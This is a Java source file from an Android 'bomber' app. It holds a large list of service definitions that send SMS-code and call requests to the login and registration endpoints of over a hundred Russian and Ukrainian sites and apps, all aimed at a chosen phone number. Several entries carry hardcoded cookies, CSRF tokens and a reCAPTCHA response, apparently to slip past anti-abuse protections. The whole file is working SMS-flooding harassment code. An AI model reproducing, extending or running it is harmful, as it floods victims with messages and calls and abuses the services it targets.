package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {
    public final static Service[] services = new Service[]{
            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
            new Ukrzoloto(), new Olltv(), new Wink(), new ProstoTV(),
            new Zdravcity(), new Robocredit(), new Tinder(), new Groshivsim(),
            new Hoff(), new Dolyame(), new Gorparkovka(), new Tinkoff(),
            new MegaDisk(), new KazanExpress(), new FoodBand(), new Gosuslugi(),
            new Citimobil(), new HHru(), new TikTok(), new Multiplex(),
            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
            new NearKitchen(), new Citydrive(), new Metro(), new RabotaRu(),
            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
            new Mokka(), new Stolichki(), new Mirkorma(), new TochkaBank(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
            new MTSBank(), new ATB(), new Paygram(), new Tele2(),
            new SravniMobile(), new TeaRU(), new PetStory(), new Profi(),
            new BeriZaryad(), new PrivetMir(), new CardsMobile(), new Labirint(),
            new CallMyPhone(), new SberMobile(), new YandexTips(), new Meloman(),
            new Choco(), new AptekaOtSklada(), new Dodopizza(), new AutoRu(),
            new SatUa(), new VapeZone(), new TakeEat(), new BibiSushi(),
            new Melzdrav(), new Fonbet(), new Stroyudacha(), new Grilnica(),
            new Trapezapizza(), new Aitu(), new Pizzaman(), new VSK(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),
            new Kari(), new Modulebank(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new ParamsService("https://www.citilink.ru/registration/confirm/phone/+") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addPathSegment(getFormattedPhone() + "/");
                }
            },

            new Service() {
                private final String url = "https://site-api.mcdonalds.ru/api/v1/user/login/phone";
                private final Headers headers = new Headers.Builder()
                        .add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0")
                        .build();

                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url(url)
                            .headers(headers)
                            .method("OPTIONS", null)
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("number", "+" + getFormattedPhone());
                                json.put("g-recaptcha-response", "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            client.newCall(new Request.Builder()
                                    .url(url)
                                    .headers(headers)
                                    .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://hotkitchen-delivery.ru/user_account/ajax5sf257.php?do=sms_code", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "8(***)***-**-**"));
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },


            new JsonService("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("login", getFormattedPhone());
                        json.put("password", "");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://oauth.av.ru/check-phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9");
                    builder.addHeader("X-CSRF-TOKEN", "1Z3KKbbDSRbhxw6ZbLVRWcmwVMIPKXej12lzJzbZ");
                    builder.addHeader("X-Ajax-Token", "5592b90ee98edbba757b233367431ad8e130b84cbeb2599262f0ebf957f36b68");
                    builder.addHeader("Cookie", "XSRF-TOKEN=eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9; laravel_session=eyJpdiI6IlkxaWo2T1A3N3YxRVdWTXVPZlVrK3c9PSIsInZhbHVlIjoiNVV4Q2xpNWZqc0xZM2xLWVwvQlZDaDRLTnBsek55VU9PZVR4b2tZQ1IwZGhCNjBuM2JKZksxdW5hZkl5Mno3YWEiLCJtYWMiOiIwZGI1YWY0MDlkMThmYmVhMjY3OWYyNDE2NGNkMjNkY2RlMDhiOGFmYjYxN2FjOTNmZjUzMmJmNDBkMjViYThhIn0%3D; session-cookie=16bc57cb02c5bcb3cb1a64b9b4819f5bd9e22f03393befd1a63c45fc465f0f8c3e8caa34700c46c53b462402658dd41e; font=phone");
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Referer", "https://oauth.av.ru/");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.ecomarket.ru/api.php", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "doRegisterOrRecover");
                        json.put("phone", format(phone, "+7-***-***-**-**"));
                        json.put("source", "web");
                        json.put("type", "call");
                        json.put("token", "bb1a2f29c78164dfb490dbae44594318");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://kakvkusno.ru/local/ajax/login.php", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=Y0S7SX43yr67KfFUdRBED3MeJctJbrb5; INPUT_ORDER_PROP_43=8.00-14.00; INPUT_PAY_SYSTEM_ID=3; INPUT_DELIVERY_ID=2; INPUT_ORDER_PROP_42=03.12.2021; BITRIX_SM_GUEST_ID=26546592; BITRIX_SM_LAST_VISIT=01.12.2021%2020%3A26%3A19; BITRIX_SM_SALE_UID=136da0bab623179cd65b58817b5da0fd; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1638392340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; INPUT_ajax_right=Y; INPUT_type=order");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("GET_CODE", "1");
                    builder.add("PHONE", format(phone, "+7(***)***-**-**"));
                    builder.add("CSRF", "32e2ae3fcf4a29e4ba5f78bb91f3c3a4");
                }
            },

            new JsonService("https://www.vprok.ru/as_send_pin") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "split_segment=8; split_segment_amount=10; XSRF-TOKEN=eyJpdiI6ImpnRVJoY0swSEVPSWtsa2JMWTJPVnc9PSIsInZhbHVlIjoiOXp0V3c4WTdUbE82U2czTTZ3dkpoNVd1T1J0YkpTNWI0c3JZdG10bVZKTFBPMmZ2a1F4Mjl5b2RETWl5ZjZvYzFkU1wvMkw1T2pPMjV0NVZYV1pYSk9BPT0iLCJtYWMiOiJiYTg1MjM2ZWQ0NGVjOTUyOTgyNzcyMDU3ZDY5MjY5NmYyNzgwNTQ0MmI1Y2Y1NzNiMmVhMWQ5ZjFmOTllMDRhIn0%3D; region=8; shop=2671; noHouse=0; fcf=3; _dy_ses_load_seq=17826%3A1638380585139; _dy_c_exps=; _dy_c_att_exps=; isUserAgreeCookiesPolicy=true; suuid=bcb02b51-0827-4b04-9723-8c80419b120b; aid=eyJpdiI6Im9PdUtnOUs4eEFncTBvRHB5R0oxS1E9PSIsInZhbHVlIjoiM0Vxa2xCd1dYeERhNVJBaE04TVlYQWVwTzlIYndHQ3ZsWFFxMjRZclg4RWlFeDBmQVwvUFdmUXBsTlNtS1VmWEFkSFJ6SXM5QVZNNmwzeGRwNk1PbEJRPT0iLCJtYWMiOiJkODE2MjBlMTI4MTIxNDRkYTVhM2NmMjYyMWUyNTFkNDQzYWM0ZTQ4MDZhYjNhYmM3NDNhMmJkODZjMjUwY2JkIn0%3D; luuid=bcb02b51-0827-4b04-9723-8c80419b120b; _dy_csc_ses=t; splitVar=test01-A");
                    builder.addHeader("X-CSRF-TOKEN", "QPhHmWEtMAoBeuKgULCeLtejbfvKD2n4yMKylL3T");
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6IjhJQkhaWWh6VEJ1SVhsZERPVk53eWc9PSIsInZhbHVlIjoiNzFsUjVOZFwvTVYrY0gxdzI4MklcL1FMS1FZUGh3OUZOcUZDdkZIQUJiOUZ5Q1VHMXd6SWptaTNQNmhCbnduT0NqVklhRFBDbXcrOG10ejVjZXIxK3RWZz09IiwibWFjIjoiZWU0NGFlYzVmZTQwOWMyYjkzNTlkNmQ0YzUxYjc4NmY3MTZiYzgwZjZlMmVlNWM5MzA2YmY1MDcxNmZkNzdkYyJ9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new MultipartService("https://groupprice.ru/auth_phone/send_phone_token") {
                @Override
                public void buildBody(MultipartBody.Builder builder) {
                    builder.addFormDataPart("phone", "+" + getFormattedPhone());
                    builder.addFormDataPart("time_zone", "180");
                    builder.addFormDataPart("redirect_back", "");
                    builder.addFormDataPart("token", "");
                }
            },

            new FormService("https://chuck-family.ru/s/get-registration-confirm-code.json", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("register_phone", format(phone, "8+***-***-**-**"));
                    builder.add("register_name", getRussianName());
                    builder.add("register_birthday", "01.01.1981");
                    builder.add("", "");
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://novayagollandiya.com/auth/?backurl=/personal/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "624313ea9d90eac9093d49000c8e2dbf");
                    builder.add("method", "sendCode");
                    builder.add("phone", format(phone, "+7+(***)-***-**-**"));
                    builder.add("registration", "N");
                }
            },

            new JsonService("https://api.petrovich.ru/api/rest/v1/user/pincode/reg?city_code=rf&client_id=pet_site") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Cookie", "SNK=124; u__typeDevice=desktop; geoQtyTryRedirect=1; u__geoUserChoose=1; qrator_msid=1638604580.330.8vox5jrGVn8JeE5a-f7j5tbrq8vdc6ae4kths8i52pi66kom8; u__geoCityGuid=d31cf195-2928-11e9-a76e-00259038e9f2; u__cityCode=rf; SIK=fAAAAHRZ8mRMMMkQ4zoJAA; SIV=1; C_o72-jqSdEZI2mxcQ9hjwCsP7WhI=AAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8D8AAIDJKZjpQfJVD28tnILC3BseM5mEUbQ; ssaid=afa34f20-54d7-11ec-9e2a-e50833b98526; dd__lastEventTimestamp=1638604588417; dd__persistedKeys=[%22custom.lastViewedProductImages%22]; dd_custom.lastViewedProductImages=[]; __tld__=null");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            }
    };
}
